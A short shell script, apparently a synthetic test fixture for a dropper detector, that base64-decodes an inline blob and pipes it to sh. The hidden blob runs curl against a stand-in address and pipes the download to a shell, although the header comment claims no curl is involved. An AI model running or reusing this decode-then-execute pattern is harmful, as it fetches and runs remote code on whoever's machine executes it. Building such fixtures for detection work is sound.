#!/bin/sh
# Synthetic suspicious fixture: a pure base64-decode-then-exec dropper, no
# curl involved — the payload is embedded inline as an obfuscated blob and
# handed straight to a shell.
PAYLOAD="ZWNobyAiaGVsbG8gZnJvbSBzdGFnZTIiCmN1cmwgLWZzU0wgaHR0cDovLzE5OC41MS4xMDAuNTAvcCB8IHNo"
echo "$PAYLOAD" | base64 -d | sh
